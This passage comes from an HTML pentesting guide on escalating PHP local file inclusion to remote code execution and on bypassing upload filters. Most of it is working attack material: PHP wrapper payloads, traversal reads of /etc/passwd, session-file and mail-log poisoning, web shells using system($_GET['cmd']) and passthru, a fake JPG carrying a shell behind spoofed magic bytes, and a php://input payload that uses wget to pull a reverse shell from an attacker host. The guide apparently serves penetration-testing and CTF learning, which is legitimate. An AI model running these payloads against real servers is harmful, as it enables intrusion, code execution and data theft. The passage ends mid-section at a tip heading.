</section>
<section id="lfi-to-remote-code-execution">
<h3>LFI to Remote Code Execution<a class="headerlink" href="#lfi-to-remote-code-execution" title="Link to this heading"></a></h3>
<p>Mainly taken from <a class="reference external" href="https://highon.coffee/blog/lfi-cheat-sheet/">LFI-Cheat-Sheet</a> , <a class="reference external" href="https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/">Exploiting PHP File Inclusion – Overview</a> and <a class="reference external" href="https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/">Upgrade from LFI to RCE via PHP Sessions</a></p>
<p>There are variety of different tricks to turn your LFI into RCE. Using</p>
<section id="file-upload-forms-functions">
<h4>File upload forms/ functions<a class="headerlink" href="#file-upload-forms-functions" title="Link to this heading"></a></h4>
<p>Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.</p>
</section>
<section id="php-wrapper-expect-command">
<h4>PHP wrapper expect://command<a class="headerlink" href="#php-wrapper-expect-command" title="Link to this heading"></a></h4>
<p>Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.</p>
<p>An example of PHP expect:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=expect://ls
</pre></div>
</div>
<p>If PHP expect wrapper is disabled, below error is encountered.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>Warning: include(): Unable to find the wrapper &quot;expect&quot; - did you forget to enable it when you&lt;br&gt; configured PHP? in /var/www/fileincl/example1.php on line 7
Warning: include(): Unable to find the&lt;br&gt; wrapper &quot;expect&quot; - did you forget to enable it when you configured PHP? in &lt;br&gt; /var/www/fileincl/example1.php on line 7
Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7
Warning: include(): Failed opening &#39;expect://ls&#39; for inclusion (include_path=&#39;.:/usr/share/php:/usr/share/pear&#39;) in /var/www/fileincl/example1.php on line 7
</pre></div>
</div>
</section>
<section id="php-wrapper-zip">
<h4>PHP Wrapper zip<a class="headerlink" href="#php-wrapper-zip" title="Link to this heading"></a></h4>
<p>Let’s say there is a upload functionality on the victim machine, however the file saved doesn’t have executeable permission, in that case if we upload a zip file containing a shellcode such as</p>
<p>Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the “system” is blocked use, scandir() for directory listing etc. )</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;&lt;?php system(&quot;</span><span class="n">ls</span><span class="s2">&quot;); ?&gt;&quot;</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>and</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">zip</span> <span class="n">shell</span><span class="o">.</span><span class="n">zip</span> <span class="n">shell</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
<p>Now, if we upload this zip file somehow to the victim machine and know it’s location (Let’s say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution</p>
<p><a class="reference external" href="http://php.net/manual/en/wrappers.compression.php">Zip Usage</a></p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="nb">zip</span><span class="p">:</span><span class="o">//</span><span class="n">archive</span><span class="o">.</span><span class="n">zip</span><span class="c1">#dir/file.txt</span>
</pre></div>
</div>
<p>Burp Request</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>GET /?parameter=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
Host: 10.50.66.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

%23 is the #
</pre></div>
</div>
<p>and we get RCE</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">index</span><span class="o">.</span><span class="n">php</span>
<span class="n">upload</span><span class="o">.</span><span class="n">php</span>
<span class="n">uploads</span>
</pre></div>
</div>
<p>We may read more about it at <a class="reference external" href="https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/">Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up</a> or <a class="reference external" href="https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur">CodeGate General CTF 2015: Owlur</a> – Read other write-ups in this.</p>
</section>
<section id="php-wrapper-phar">
<h4>PHP Wrapper phar<a class="headerlink" href="#php-wrapper-phar" title="Link to this heading"></a></h4>
<p>RCE can also be done using <a class="reference external" href="http://php.net/manual/en/phar.using.stream.php">Using Phar Archives: the phar stream wrapper</a></p>
</section>
<section id="php-wrapper-php-file">
<h4>PHP wrapper php://file<a class="headerlink" href="#php-wrapper-php-file" title="Link to this heading"></a></h4>
</section>
<section id="php-wrapper-php-filter">
<h4>PHP wrapper php://filter<a class="headerlink" href="#php-wrapper-php-filter" title="Link to this heading"></a></h4>
<p>php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.</p>
<p>The output is encoded using base64, so you’ll need to decode the output.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
</pre></div>
</div>
<p>or</p>
<p>We could use php filter to read the source code of a PHP File</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
</pre></div>
</div>
<p>More information can be found at <a class="reference external" href="https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/">Using PHP for file inclusion</a></p>
</section>
<section id="php-input-stream">
<h4>PHP input:// stream<a class="headerlink" href="#php-input-stream" title="Link to this heading"></a></h4>
<p>php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.</p>
<p>Send your payload in the POST request using curl, burp.</p>
<p>Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>http://IP/fileincl/example1.php?page=php://input
</pre></div>
</div>
<p>Post Data payload:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;? system(&#39;wget http://IP/php-reverse-shell.php -O /var/www/shell.php&#39;);?&gt;
</pre></div>
</div>
<p>After uploading execute the reverse shell at</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span>
</pre></div>
</div>
</section>
<section id="data-text-plain-base64-command">
<h4><a class="reference external" href="data://text/plain;base64,command">data://text/plain;base64,command</a><a class="headerlink" href="#data-text-plain-base64-command" title="Link to this heading"></a></h4>
</section>
<section id="proc-self-environ">
<h4>/proc/self/environ<a class="headerlink" href="#proc-self-environ" title="Link to this heading"></a></h4>
<p>If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.</p>
</section>
<section id="proc-self-fd">
<h4>/proc/self/fd<a class="headerlink" href="#proc-self-fd" title="Link to this heading"></a></h4>
<p>If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.</p>
<p>This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc.
Utilize <a class="reference external" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt">LFI-LogFileCheck.txt</a> with Burp Intruder, and check for the returned page sizes.</p>
</section>
<section id="control-over-php-session-values">
<h4>Control over PHP Session Values<a class="headerlink" href="#control-over-php-session-values" title="Link to this heading"></a></h4>
<p>Let’s say, a vulnerable page is present with the post request</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
Content-Length: 44
Connection: close
Upgrade-Insecure-Requests: 1

login=1&amp;user=admin&amp;pass=admin&amp;lang=en_us.php
</pre></div>
</div>
<p>with LFI</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">login</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">user</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="k">pass</span><span class="o">=</span><span class="n">admin</span><span class="o">&amp;</span><span class="n">lang</span><span class="o">=../../../../../../../../../../</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
</pre></div>
</div>
<p>Now, the server store cookies</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">PHPSESSID</span><span class="o">=</span><span class="n">i56kgbsq9rm8ndg3qbarhsbm27</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span>
<span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">user</span><span class="o">=</span><span class="n">admin</span><span class="p">;</span> <span class="n">expires</span><span class="o">=</span><span class="n">Mon</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Aug</span><span class="o">-</span><span class="mi">2018</span> <span class="mi">20</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">29</span> <span class="n">GMT</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span><span class="p">;</span> <span class="n">httponly</span>
<span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="k">pass</span><span class="o">=</span><span class="n">admin</span><span class="p">;</span> <span class="n">expires</span><span class="o">=</span><span class="n">Mon</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Aug</span><span class="o">-</span><span class="mi">2018</span> <span class="mi">20</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">29</span> <span class="n">GMT</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span><span class="p">;</span> <span class="n">httponly</span>
</pre></div>
</div>
<p>As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27</p>
<p>Now, we can write the cookie with a php command</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
Content-Length: 134
Connection: close
Upgrade-Insecure-Requests: 1

login=1&amp;user=&lt;?php system(&quot;cat /etc/passwd&quot;);?&gt;&amp;pass=password&amp;lang=en_us.php
</pre></div>
</div>
<p>This would result in</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Set</span><span class="o">-</span><span class="n">Cookie</span><span class="p">:</span> <span class="n">user</span><span class="o">=%</span><span class="mi">3</span><span class="n">C</span><span class="o">%</span><span class="mi">3</span><span class="n">Fphp</span><span class="o">+</span><span class="n">system</span><span class="o">%</span><span class="mi">28</span><span class="o">%</span><span class="mi">22</span><span class="n">cat</span><span class="o">+%</span><span class="mi">2</span><span class="n">Fetc</span><span class="o">%</span><span class="mi">2</span><span class="n">Fpasswd</span><span class="o">%</span><span class="mi">22</span><span class="o">%</span><span class="mi">29</span><span class="o">%</span><span class="mi">3</span><span class="n">B</span><span class="o">%</span><span class="mi">3</span><span class="n">F</span><span class="o">%</span><span class="mi">3</span><span class="n">E</span><span class="p">;</span> <span class="n">expires</span><span class="o">=</span><span class="n">Mon</span><span class="p">,</span> <span class="mi">13</span><span class="o">-</span><span class="n">Aug</span><span class="o">-</span><span class="mi">2018</span> <span class="mi">20</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">53</span> <span class="n">GMT</span><span class="p">;</span> <span class="n">path</span><span class="o">=/</span><span class="p">;</span> <span class="n">httponly</span>
</pre></div>
</div>
<p>Now, the php command can be executed using</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Upgrade-Insecure-Requests: 1

login=1&amp;user=admin&amp;pass=password&amp;lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
</pre></div>
</div>
<p>The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)</p>
</section>
<section id="email-server">
<h4>Email Server<a class="headerlink" href="#email-server" title="Link to this heading"></a></h4>
<p>If the email server allows you to send email unauthorized and we know the usernames on the system, we probably can utilize it to do remote code execution by using telnet and connecting to port 25</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>EHLO example.com
VRFY username@example.com
MAIL FROM: pwned@domain.com
RCPT TO: username@example.com
DATA

Subject: Owned
&lt;?php echo system($_REQUEST[&#39;cmd&#39;]); ?&gt;

.

Mail Queued
</pre></div>
</div>
<p>and as we have LFI, we can read the email by</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">../../../</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="o">/</span><span class="n">username</span> <span class="o">&amp;</span><span class="n">cmd</span><span class="o">=</span><span class="n">whoami</span>
</pre></div>
</div>
<p>The above would probably differ on the request of your LFI.</p>
</section>
</section>
</section>
<section id="appendix-ii-file-upload">
<span id="a2-file-upload"></span><h2>Appendix-II : File Upload<a class="headerlink" href="#appendix-ii-file-upload" title="Link to this heading"></a></h2>
<section id="examples">
<h3>Examples<a class="headerlink" href="#examples" title="Link to this heading"></a></h3>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>If sometimes, we are trying to upload a php file and it’s not a allowed extension, maybe try with php5 extension. The file extension tells the web server which version of PHP to use.
Some web servers are set up so that PHP 4 is the default, and you have to use .php5 to tell it to use PHP 5.</p>
</div>
<section id="simple-file-upload">
<h4>Simple File Upload<a class="headerlink" href="#simple-file-upload" title="Link to this heading"></a></h4>
<p>Intercepting the request in Burp/ ZAP and changing the file-extension.</p>
<p>Below is the PHP code</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?

function genRandomString() {
  $length = 10;
  $characters = &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;;
  $string = &quot;&quot;;

  for ($p = 0; $p &lt; $length; $p++) {
      $string .= $characters[mt_rand(0, strlen($characters)-1)];
  }

  return $string;
}

function makeRandomPath($dir, $ext) {
  do {
  $path = $dir.&quot;/&quot;.genRandomString().&quot;.&quot;.$ext;
  } while(file_exists($path));
  return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
  $ext = pathinfo($fn, PATHINFO_EXTENSION);
  return makeRandomPath($dir, $ext);
}

if(array_key_exists(&quot;filename&quot;, $_POST)) {
  $target_path = makeRandomPathFromFilename(&quot;upload&quot;, $_POST[&quot;filename&quot;]);


      if(filesize($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;]) &gt; 1000) {
      echo &quot;File is too big&quot;;
  } else {
      if(move_uploaded_file($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;], $target_path)) {
          echo &quot;The file &lt;a href=\&quot;$target_path\&quot;&gt;$target_path&lt;/a&gt; has been uploaded&quot;;
      } else{
          echo &quot;There was an error uploading the file, please try again!&quot;;
      }
  }
} else {
?&gt;
&lt;form enctype=&quot;multipart/form-data&quot; action=&quot;index.php&quot; method=&quot;POST&quot;&gt;
&lt;input type=&quot;hidden&quot; name=&quot;MAX_FILE_SIZE&quot; value=&quot;1000&quot; /&gt;
&lt;input type=&quot;hidden&quot; name=&quot;filename&quot; value=&quot;&lt;? print genRandomString(); ?&gt;.jpg&quot; /&gt;
Choose a JPEG to upload (max 1KB):&lt;br/&gt;
&lt;input name=&quot;uploadedfile&quot; type=&quot;file&quot; /&gt;&lt;br /&gt;
&lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; /&gt;
&lt;/form&gt;
&lt;? } ?&gt;
</pre></div>
</div>
<p>If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.</p>
<ul>
<li><p>Create a fake JPG containing php code.</p>
<p>We’ll be using system() to read our password.</p>
</li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">echo</span> <span class="s2">&quot;&lt;?php system($_GET[&quot;</span><span class="n">cmd</span><span class="s2">&quot;]); ?&gt;&quot;</span> <span class="o">&gt;</span> <span class="n">shell</span><span class="o">.</span><span class="n">jpg</span>
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li><p>Upload JPG, intercept in Burp/ ZAP and change the extension</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span> <span class="o">&lt;</span><span class="nb">input</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;filename&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;o0xn5q93si.jpg&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="o">&gt;</span>

<span class="ow">is</span> <span class="n">changed</span> <span class="n">to</span>
</pre></div>
</div>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="nb">input</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;filename&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;o0xn5q93si.php&quot;</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span><span class="o">&gt;</span>
</pre></div>
</div>
</div></blockquote>
</section>
<section id="simple-file-upload-with-verifying-image-type">
<h4>Simple File Upload - With verifying image type<a class="headerlink" href="#simple-file-upload-with-verifying-image-type" title="Link to this heading"></a></h4>
<p>In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>&lt;?php
...

else if (! exif_imagetype($_FILES[&#39;uploadedfile&#39;][&#39;tmp_name&#39;])) {
      echo &quot;File is not an image&quot;;
  }

...

?&gt;
</pre></div>
</div>
<p>Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a “Magic Number” at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.</p>
<ul class="simple">
<li><p>Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let’s say first 100 bytes)</p></li>
</ul>
<blockquote>
<div><div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hexdump</span> <span class="o">-</span><span class="n">n</span> <span class="mi">100</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;100/1 &quot;</span><span class="se">\\</span><span class="s1">x</span><span class="si">%02X</span><span class="s1">&quot; &quot;</span><span class="se">\n</span><span class="s1">&quot;&#39;</span> <span class="n">sunflower</span><span class="o">.</span><span class="n">jpg</span>

<span class="o">-</span><span class="n">n</span> <span class="n">length</span>         <span class="p">:</span> <span class="n">Interpret</span> <span class="n">only</span> <span class="n">length</span> <span class="nb">bytes</span> <span class="n">of</span> <span class="n">Input</span>
<span class="o">-</span><span class="n">e</span> <span class="n">format_string</span>  <span class="p">:</span> <span class="n">Specify</span> <span class="n">a</span> <span class="nb">format</span> <span class="n">string</span> <span class="n">to</span> <span class="n">be</span> <span class="n">used</span> <span class="k">for</span> <span class="n">displaying</span> <span class="n">data</span>
</pre></div>
</div>
<p>Example:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">hexdump</span> <span class="o">-</span><span class="n">n</span> <span class="mi">100</span> <span class="o">-</span><span class="n">e</span> <span class="s1">&#39;100/1 &quot;</span><span class="se">\\</span><span class="s1">x</span><span class="si">%02X</span><span class="s1">&quot; &quot;</span><span class="se">\n</span><span class="s1">&quot;&#39;</span> <span class="n">sunflower</span><span class="o">.</span><span class="n">jpg</span>
\<span class="n">xFF</span>\<span class="n">xD8</span>\<span class="n">xFF</span>\<span class="n">xE0</span>\<span class="n">x00</span>\<span class="n">x10</span>\<span class="n">x4A</span>\<span class="n">x46</span>\<span class="n">x49</span>\<span class="n">x46</span>\<span class="n">x00</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x01</span>\<span class="n">x2C</span>\<span class="n">x01</span>\<span class="n">x2C</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xFF</span>\<span class="n">xE1</span>\<span class="n">x00</span>\<span class="n">x16</span>\<span class="n">x45</span>\<span class="n">x78</span>\<span class="n">x69</span>\<span class="n">x66</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x4D</span>\<span class="n">x4D</span>\<span class="n">x00</span>\<span class="n">x2A</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x08</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">xFF</span>\<span class="n">xDB</span>\<span class="n">x00</span>\<span class="n">x43</span>\<span class="n">x00</span>\<span class="n">x05</span>\<span class="n">x03</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x03</span>\<span class="n">x05</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x04</span>\<span class="n">x05</span>\<span class="n">x05</span>\<span class="n">x05</span>\<span class="n">x06</span>\<span class="n">x07</span>\<span class="n">x0C</span>\<span class="n">x08</span>\<span class="n">x07</span>\<span class="n">x07</span>\<span class="n">x07</span>\<span class="n">x07</span>\<span class="n">x0F</span>\<span class="n">x0B</span>\<span class="n">x0B</span>\<span class="n">x09</span>\<span class="n">x0C</span>\<span class="n">x11</span>\<span class="n">x0F</span>\<span class="n">x12</span>\<span class="n">x12</span>\<span class="n">x11</span>\<span class="n">x0F</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x13</span>\<span class="n">x16</span>\<span class="n">x1C</span>\<span class="n">x17</span>\<span class="n">x13</span>\<span class="n">x14</span>\<span class="n">x1A</span>\<span class="n">x15</span>\<span class="n">x11</span>\<span class="n">x11</span>\<span class="n">x18</span>\<span class="n">x21</span>\<span class="n">x18</span>\<span class="n">x1A</span>\<span class="n">x1D</span>\<span class="n">x1D</span>\<span class="n">x1F</span>
</pre></div>
</div>
</div></blockquote>
<ul>
<li><p>Create a file with JPG header and command shell code using python</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="n">fh</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;shell.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">fh</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;The Hexdump from above </span><span class="se">\xFF\xD8\xFF\xE0</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="s1">&#39;&lt;? passthru($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="p">)</span>
<span class="gp">&gt;&gt;&gt; </span><span class="n">fh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</pre></div>
</div>
</li>
</ul>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
<p>Do check the source code of the page for any client-side file validation or any commented hidden parameters?</p>
</div>
<p>We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.</p>
</section>
<section id="modifying-file-upload-page">
<h4>Modifying File Upload Page<a class="headerlink" href="#modifying-file-upload-page" title="Link to this heading"></a></h4>
<p>Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there’s a LFI and we have seen the code of upload function. The first thing to check would be “What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc.”</p>
<p>Let’s say, there is a upload form which has a text-field for accepting input (Let’s say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let’s see the current form in inspect-element.</p>
<p>Client-Side Code</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">form</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">&quot;multipart/form-data&quot;</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;?op=upload&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="n">textarea</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:400px; height:150px;&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">textarea</span><span class="o">&gt;&lt;</span><span class="n">br</span><span class="o">&gt;</span>
       <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:355px;&quot;</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;Send Tip!&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>If we see the above form, accepts two inputs</p>
<ul class="simple">
<li><p>text type field named sinfo for providing detailed information about the server and</p></li>
<li><p>text type field named name for providing name of the server.</p></li>
</ul>
<p>Let’s also see, serverside code</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>if(isset($_POST[&#39;submit&#39;]) &amp;&amp; isset($_POST[&#39;sinfo&#39;])) {
               $tip = $_POST[&#39;sinfo&#39;];
               $secretname = Random_Filename();  ## Generates a random file name
           $location = Random_Number();      ## Generate a random number
               file_put_contents(&quot;uploads/&quot;. $location . &#39;/&#39; . $secretname,  $sinfo);
</pre></div>
</div>
<p>If we see, the contents of sinfo are directly put in a file.</p>
<p>In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">form</span> <span class="n">enctype</span><span class="o">=</span><span class="s2">&quot;multipart/form-data&quot;</span> <span class="n">action</span><span class="o">=</span><span class="s2">&quot;?op=upload&quot;</span> <span class="n">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
<span class="c1">#  &lt;textarea style=&quot;width:400px; height:150px;&quot; id=&quot;sinfo&quot; name=&quot;sinfo&quot;&gt; &lt;/textarea&gt;&lt;br&gt; ---------- We have commented this and add the below line.</span>
       <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;file&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;sinfo&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:355px;&quot;</span><span class="o">&gt;</span>
       <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;text&quot;</span> <span class="nb">id</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;name&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;width:355px;&quot;</span><span class="o">&gt;</span>
   <span class="o">&lt;</span><span class="nb">input</span> <span class="nb">type</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;submit&quot;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&quot;Send Tip!&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">form</span><span class="o">&gt;</span>
</pre></div>
</div>
<p>Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.</p>
<div class="admonition tip">
<p class="admonition-title">Tip</p>
